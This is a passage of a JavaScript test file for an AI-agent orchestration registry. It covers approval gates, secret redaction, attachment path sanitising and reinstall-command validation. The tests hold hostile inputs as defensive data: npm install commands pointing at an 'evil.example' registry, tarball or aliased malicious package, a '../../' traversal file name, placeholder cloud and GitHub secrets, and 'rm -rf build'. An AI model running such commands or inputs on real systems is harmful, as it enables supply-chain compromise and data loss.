      () => registry.assertAgentToolAllowed('audit.accept', { laneId: lane.id }),
      (err) => err.status === 409 && /not allowed while lane is "running"/.test(err.message) && Boolean(err.nextAction),
    );

    target.state = 'ready_for_audit';
    // Now audit.accept is legal; submit is not.
    assert.equal(registry.assertAgentToolAllowed('audit.accept', { laneId: lane.id }), true);
    assert.throws(
      () => registry.assertAgentToolAllowed('lane.submit', { laneId: lane.id }),
      (err) => err.status === 409,
    );

    // critique.findings.record only legal in needs_critique.
    assert.throws(() => registry.assertAgentToolAllowed('critique.findings.record', { laneId: lane.id }), (e) => e.status === 409);
    target.state = 'needs_critique';
    assert.equal(registry.assertAgentToolAllowed('critique.findings.record', { laneId: lane.id }), true);

    // Ungated tools always pass regardless of state.
    assert.equal(registry.assertAgentToolAllowed('lane.shutdown', { laneId: lane.id }), true);
    assert.equal(registry.assertAgentToolAllowed('lane.create', { laneId: lane.id }), true);
  } finally {
    await cleanup();
  }
});

test('lane approval flow records, decides, and surfaces pending approvals', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Approval Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Approval Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, { title: 'work', executorType: 'mock' }, { approved: true, actor: 'test' });
    registry.getLane(lane.id).state = 'running';

    const req1 = registry.recordLaneApproval(lane.id, { kind: 'command', detail: 'rm -rf build', actor: 'executor' });
    assert.equal(req1.approval.status, 'pending');
    assert.equal(req1.lane.awaitingApproval, true);

    const listing = registry.getLaneApprovals(lane.id);
    assert.equal(listing.awaitingApproval, true);
    assert.equal(listing.approvals.length, 1);
    assert.equal(listing.approvals[0].kind, 'command');

    const decided = registry.decideLaneApproval(lane.id, req1.approval.id, { decision: 'approve', actor: 'orchestrator' });
    assert.equal(decided.approval.status, 'approved');
    assert.equal(decided.approval.decidedBy, 'orchestrator');
    assert.equal(registry.getLaneApprovals(lane.id).awaitingApproval, false);

    // Re-deciding a settled approval is refused.
    assert.throws(
      () => registry.decideLaneApproval(lane.id, req1.approval.id, { decision: 'deny', actor: 'orchestrator' }),
      (err) => err.status === 409,
    );

    // A second request can be denied.
    const req2 = registry.recordLaneApproval(lane.id, { kind: 'patch', detail: 'apply patch', actor: 'executor' });
    const denied = registry.decideLaneApproval(lane.id, req2.approval.id, { decision: 'deny', actor: 'user' });
    assert.equal(denied.approval.status, 'denied');

    // Invalid decision is rejected.
    const req3 = registry.recordLaneApproval(lane.id, { kind: 'tool', detail: 'x', actor: 'executor' });
    assert.throws(
      () => registry.decideLaneApproval(lane.id, req3.approval.id, { decision: 'maybe' }),
      (err) => err.status === 422,
    );
  } finally {
    await cleanup();
  }
});

test('updateSessionPlan stores goal and plan with audit', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Plan Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Plan Session' }, { actor: 'test', approved: true });
    const updated = registry.updateSessionPlan(session.id, { goal: 'Ship v1', plan: '1. build\n2. test', actor: 'orchestrator' });
    assert.equal(updated.goal, 'Ship v1');
    assert.match(updated.plan, /build/);
    assert.ok(updated.planUpdatedAt);
    assert.throws(() => registry.updateSessionPlan(session.id, {}), (e) => e.status === 422);
  } finally {
    await cleanup();
  }
});

test('saveSessionAttachment stores a file under session artifacts and rejects bad input', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Attach Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Attach Session' }, { actor: 'test', approved: true });
    const png = Buffer.from('hello-screenshot').toString('base64');
    const ref = await registry.saveSessionAttachment(session.id, { name: '../../evil shot.png', contentType: 'image/png', dataBase64: png });
    assert.match(ref.filename, /evil_shot\.png$/); // traversal + spaces sanitized
    assert.ok(ref.url.startsWith(`/artifacts/${session.id}/attachments/`));
    assert.equal(ref.bytes, Buffer.from('hello-screenshot').length);
    const fs = await import('node:fs/promises');
    await fs.access(ref.path); // file actually written
    assert.ok(ref.path.includes('/attachments/'));

    await assert.rejects(() => registry.saveSessionAttachment(session.id, { name: 'x', dataBase64: '' }), (e) => e.status === 422);
  } finally {
    await cleanup();
  }
});

test('notification redaction scrubs secret formats and the orca token name', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const note = registry.enqueueNotification({
      severity: 'error',
      title: 'Lane failed with orca-api-token leak',
      body: 'env ORCA_OPENAI_COMPATIBLE_API_KEY=sk-abcdef123456 and Bearer abc.def-ghi and ghp_ABCDEFGHIJKLMNOPQRST12345 and AKIAABCDEFGHIJKLMNOP',
    });
    assert.ok(note, 'notification enqueued');
    const fetched = registry.getNotifications({ limit: 5 }).notifications.find((n) => n.id === note.id);
    const blob = `${fetched.title} ${fetched.body}`;
    assert.ok(!/sk-abcdef123456/.test(blob), 'sk- secret redacted');
    assert.ok(!/ghp_ABCDEFGHIJKLMNOPQRST12345/.test(blob), 'github PAT redacted');
    assert.ok(!/AKIAABCDEFGHIJKLMNOP/.test(blob), 'AWS key redacted');
    assert.ok(!/Bearer abc\.def-ghi/.test(blob), 'bearer redacted');
    assert.ok(/REDACTED/.test(blob), 'redaction markers present');
    assert.ok(!/orca-api-token/i.test(blob), 'orca token name redacted');
  } finally {
    await cleanup();
  }
});

test('deduped notifications recur as unread with updated visible fields', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const first = registry.enqueueNotification({
      type: 'loop',
      severity: 'warning',
      title: 'Loop paused',
      body: 'First pause',
      dedupeKey: 'loop-paused:test',
      href: '/projects/a',
    });
    assert.ok(first?.id);
    registry.markNotificationRead(first.id, { actor: 'test' });
    const read = registry.getNotifications({ limit: 5 }).notifications.find((n) => n.id === first.id);
    assert.ok(read.readAt);

    const second = registry.enqueueNotification({
      type: 'loop',
      severity: 'error',
      title: 'Loop paused again',
      body: 'Second pause',
      actor: 'loop-daemon',
      dedupeKey: 'loop-paused:test',
      href: '/projects/b',
      metadata: { reason: 'rate_limit' },
    });
    assert.equal(second.id, first.id);
    assert.equal(second.occurrences, 2);
    assert.equal(second.readAt, null);
    assert.equal(second.title, 'Loop paused again');
    assert.equal(second.severity, 'error');
    assert.equal(second.href, '/projects/b');
    const state = registry.getNotifications({ limit: 5 });
    assert.equal(state.unreadCount, 1);
    assert.ok(registry.auditEvents.some((event) => event.type === 'notification_deduped' && event.evidence?.occurrences === 2));
  } finally {
    await cleanup();
  }
});

test('reinstall override rejects alternate registries, alias packages, and bare URLs', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const bad = [
      'npm install -g codex --registry https://evil.example/',
      'npm install -g codex https://evil.example/pkg.tgz',
      'npm install -g @anthropic/claude-code@npm:evil-pkg',
      'npm install -g codex --config cache=/tmp/x',
    ];
    for (const command of bad) {
      const type = command.includes('claude') ? 'claude' : 'codex';
      await assert.rejects(
        () => registry.runExecutorCliReinstall(type, { actor: 'dashboard', approved: true, execute: false, command }),
        (e) => e.status === 422 && /Invalid reinstall command override/.test(e.message || ''),
        `should reject: ${command}`,
      );
    }
    // A clean, allowlisted override still plans successfully (dry run).
    const ok = await registry.runExecutorCliReinstall('codex', {
      actor: 'dashboard', approved: true, execute: false,
      command: 'npm install --yes -g @openai/codex',
    });
    assert.ok(ok, 'clean override plans');
  } finally {
    await cleanup();
  }
});

test('evidence lookups resolve mode helpers (getLatestEvidence/getEvidenceFiles do not throw)', async () => {
  // Regression: inferEvidenceMode/normalizeEvidenceModeList were defined in
  // registry.js but used only in registry-evidence.js; the split orphaned them
  // so getLatestEvidence threw "normalizeEvidenceModeList is not defined" (500
  // on GET /api/lanes/:id/evidence/latest). Exercise both evidence readers.
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Evidence Project' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Evidence Session' }, { actor: 'test', approved: true });
    const lane = registry.createLane(session.id, { title: 'evidence lane', executorType: 'mock' }, { approved: true, actor: 'test' });

    const latest = await registry.getLatestEvidence(lane.id, { mode: 'screenshot' });
    assert.equal(latest.laneId, lane.id);
    assert.equal(latest.requestedMode, 'screenshot');

    const files = await registry.getEvidenceFiles(lane.id);
    assert.ok(Array.isArray(files), 'evidence files list resolves');
  } finally {
    await cleanup();
  }
});

test('deleteSession permanently removes an archived session and refuses active ones', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Del' }, { actor: 'test', approved: true });
    const session = registry.createSession(project.id, { name: 'Chat' }, { actor: 'test', approved: true });
    await assert.rejects(() => registry.deleteSession(session.id, { actor: 'test' }), (e) => e.status === 409 && e.requiresApproval);
    await assert.rejects(() => registry.deleteSession(session.id, { actor: 'test', approved: true }), (e) => e.status === 422);
    await registry.updateSession(session.id, { state: 'archived' }, { actor: 'test', approved: true });
    await assert.rejects(() => registry.deleteSession(session.id, { actor: 'test' }), (e) => e.status === 409 && e.requiresApproval);
    const result = await registry.deleteSession(session.id, { actor: 'test', approved: true });
    assert.equal(result.deleted, true);
    assert.equal(registry.getSession(session.id), undefined, 'session record is gone');
  } finally {
    await cleanup();
  }
});

test('deleteProject requires approval and archived state before permanent removal', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  try {
    const project = registry.createProject({ name: 'Delete Project' }, { actor: 'test', approved: true });
    registry.createSession(project.id, { name: 'Nested' }, { actor: 'test', approved: true });
    await assert.rejects(() => registry.deleteProject(project.id, { actor: 'test' }), (e) => e.status === 409 && e.requiresApproval);
    await assert.rejects(() => registry.deleteProject(project.id, { actor: 'test', approved: true }), (e) => e.status === 422);
    registry.updateProject(project.id, { state: 'archived' }, { actor: 'test', approved: true });
    const result = await registry.deleteProject(project.id, { actor: 'test', approved: true });
    assert.equal(result.deleted, true);
    assert.equal(registry.getProject(project.id), undefined);
    assert.equal(registry.listArchived().projects.length, 0);
  } finally {
    await cleanup();
  }
});

test('approved repo roots default to HOME, and the dir picker opens into it', async () => {
  const { registry, cleanup } = await withIsolatedRegistry();
  const savedEnv = process.env.ORCA_REPO_ROOTS;
  delete process.env.ORCA_REPO_ROOTS;
  try {
    const home = os.homedir();
    const roots = registry.getApprovedRepoRoots();
    assert.ok(roots.includes(path.resolve(home)), 'HOME is an approved browse root by default');
    // The picker opens INTO a directory (lists folders), not a bare roots chooser.
    const view = await registry.listWorkstationDirs({});
    assert.ok(view.path, 'picker opens into a directory by default');
    assert.ok(Array.isArray(view.entries), 'picker returns folder entries');
  } finally {
    if (savedEnv === undefined) delete process.env.ORCA_REPO_ROOTS; else process.env.ORCA_REPO_ROOTS = savedEnv;
    await cleanup();
  }
});
